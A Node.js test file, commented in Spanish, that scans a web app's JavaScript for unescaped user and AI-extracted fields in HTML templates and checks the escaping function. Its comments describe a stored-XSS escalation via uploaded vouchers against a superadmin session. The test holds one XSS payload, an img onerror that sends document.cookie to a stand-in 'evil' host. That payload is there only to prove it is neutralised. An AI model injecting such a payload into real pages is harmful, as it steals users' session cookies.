/* Datos de usuario pintados dentro de HTML sin escapar (XSS almacenado).

   Lo que lo hace grave acá y no en cualquier app: la CSP permite
   `script-src 'unsafe-inline'` (el menú y los botones usan onclick en línea),
   así que un `<img src=x onerror=...>` guardado en un campo SÍ se ejecuta.

   EL CASO REAL que destapó esto: el Panel SaaS pintaba sin escapar el nombre
   del comercio, el banco y la referencia que la IA LEE DE LA IMAGEN del
   voucher que sube el cliente. Cualquier comercio podía subir un voucher con
   HTML dentro y ejecutarlo en la sesión del SUPERADMIN — la que ve a todos los
   comercios y puede llamar a tenant-db-tools, que borra un taller entero.
   No era un XSS "de su propio tenant": era escalada entre comercios.

   Esta prueba no revisa un archivo: revisa la REGLA en todo js/, para que el
   próximo campo que alguien interpole quede en rojo acá y no en producción. */
const fs = require('fs');
const path = require('path');

const raiz = path.join(__dirname, '..');

/* Campos que los escribe gente de afuera (clientes, empleados, quien se
   registra) o que produce la IA leyendo un documento subido. */
const CAMPOS = /\.(nombre|nombre_completo|direccion|notas|observaciones|descripcion|comentario|razon_social|referencia|apellido|profesion|titulo|motivo|detalle|marca|modelo|email)\b/;
/* Ya neutralizan el valor o lo convierten en número/fecha. */
const SEGURO = /esc\(|UI\.q\(|UI\.fecha\(|Number\(|parseInt|parseFloat|toFixed|\.length\b|JSON\.stringify|encodeURI/;
/* La expresión arma etiquetas a propósito (no es un dato suelto). */
const PRODUCE_HTML = /<[a-z]/i;
const TAG = /<(div|span|td|tr|li|p|h[1-6]|option|button|b|strong|a|img|label|small|input)\b/i;

function archivosJS(dir, acc = []) {
  for (const f of fs.readdirSync(dir, { withFileTypes: true })) {
    if (f.name === 'node_modules' || f.name.startsWith('.')) continue;
    const p = path.join(dir, f.name);
    if (f.isDirectory()) archivosJS(p, acc);
    else if (f.name.endsWith('.js')) acc.push(p);
  }
  return acc;
}

function sinEscapar() {
  const hallazgos = [];
  for (const f of archivosJS(path.join(raiz, 'js'))) {
    const src = fs.readFileSync(f, 'utf8');
    for (const tpl of src.match(/`(?:[^`\\]|\\[\s\S])*`/g) || []) {
      if (!TAG.test(tpl)) continue;                       // no produce HTML
      for (const e of tpl.match(/\$\{(?:[^{}]|\{[^{}]*\})*\}/g) || []) {
        if (!CAMPOS.test(e) || SEGURO.test(e) || PRODUCE_HTML.test(e)) continue;
        hallazgos.push({
          archivo: path.relative(raiz, f),
          linea: src.slice(0, src.indexOf(tpl)).split('\n').length,
          expr: e.replace(/\s+/g, ' ').slice(0, 70),
        });
      }
    }
  }
  return hallazgos;
}

let pasadas = 0, fallidas = 0;
const ok = (n, c) => { if (c) { pasadas++; console.log('PASS — ' + n); } else { fallidas++; console.log('FAIL — ' + n); } };

/* ── La regla ───────────────────────────────────────────────────────────── */
{
  const h = sinEscapar();
  ok(`ningún campo de usuario se pinta sin escapar (encontrados: ${h.length})`, h.length === 0);
  h.slice(0, 25).forEach(x => console.log(`        ↳ ${x.archivo}:${x.linea}  ${x.expr}`));
  if (h.length > 25) console.log(`        ↳ ...y ${h.length - 25} más`);
}

/* ── El escapador hace su trabajo ───────────────────────────────────────── */
{
  const ui = fs.readFileSync(path.join(raiz, 'js', 'core', 'ui.js'), 'utf8');
  const m = ui.match(/esc\(valor=''\)\s*\{[\s\S]*?\n  \}/);
  ok('existe UI.esc', !!m);

  /* Se evalúa la función real, no una copia: si alguien le quita un replace,
     esta prueba lo ve. */
  const esc = new Function('return function ' + m[0])();
  ok('escapa <', esc('<b>').indexOf('<') === -1);
  ok('escapa >', esc('<b>').indexOf('>') === -1);
  ok('escapa comillas dobles', esc('"x"').indexOf('"') === -1);
  ok('escapa comillas simples (atributos con \')', esc("'x'").indexOf("'") === -1);
  ok('escapa & (si no, &lt; se puede reconstruir)', esc('&').includes('&amp;'));
  ok('null no revienta ni imprime "null"', esc(null) === '');
  ok('undefined tampoco', esc(undefined) === '');
  ok('los números pasan intactos', esc(1500.5) === '1500.5');

  /* El ataque concreto del Panel SaaS. */
  const payload = '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">';
  const salida = esc(payload);
  ok('un voucher con <img onerror> queda inerte',
     !/<img/i.test(salida) && !salida.includes('onerror="'));
}

/* ── El Panel SaaS en concreto ──────────────────────────────────────────── */
{
  const sa = fs.readFileSync(path.join(raiz, 'js', 'modulos', 'admin', 'superadmin.js'), 'utf8');
  ok('el nombre del comercio se escapa en la tabla de vouchers',
     /UI\.esc\(t\?\.name\|\|t\?\.slug/.test(sa));
  ok('la referencia leída por la IA se escapa',
     /UI\.esc\(v\.referencia_detectada/.test(sa));
  ok('el banco se escapa', /UI\.esc\(v\.banco/.test(sa));
  /* Los checks se unen con <br> nuestro, pero cada uno va escapado. */
  ok('los checks de la IA se escapan uno por uno antes de unirlos',
     /checks\|\|\[\]\)\.map\(c=>UI\.esc\(c\)\)\.join\('<br>'\)/.test(sa));
}

console.log(`   ${pasadas} pasadas, ${fallidas} fallidas`);
if (fallidas) process.exitCode = 1;
